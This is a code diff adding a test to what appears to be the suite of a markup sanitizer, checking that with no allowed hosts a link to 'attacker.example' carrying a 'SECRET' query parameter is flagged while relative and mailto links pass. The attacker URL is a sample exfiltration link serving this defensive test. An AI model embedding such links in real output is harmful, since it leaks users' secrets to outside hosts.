@@ -146,6 +146,14 @@ def test_allowed_url_hosts_stop_exfiltration_through_images():
         assert "host that is not allowed" in problems(["img", {"src": url}], **hosts)[0]
 
 
+def test_empty_host_list_allows_no_external_urls():
+    assert problems('(p (a :href "https://attacker.example/log?d=SECRET" "Click"))', allowed_url_hosts=[]) == [
+        "p > a[1]: href='https://attacker.example/log?d=SECRET' points to another site, "
+        "and no external sites are allowed. Use a relative URL"]
+    assert render_data('(p (a :href "/docs" "Docs") (a :href "mailto:a@b.fi" "Mail"))', allowed_url_hosts=[]) == (
+        "<p><a href=/docs>Docs</a><a href=mailto:a@b.fi>Mail</a></p>")
+
+
 def test_allowlists():
     options = {"allowed_tags": ["p", "a", "b"], "allowed_attributes": ["href", "data-*", "aria-*"]}
     assert render_data('(p (a :href "/x" :data-id "1" :aria-label "l" "x"))', **options)
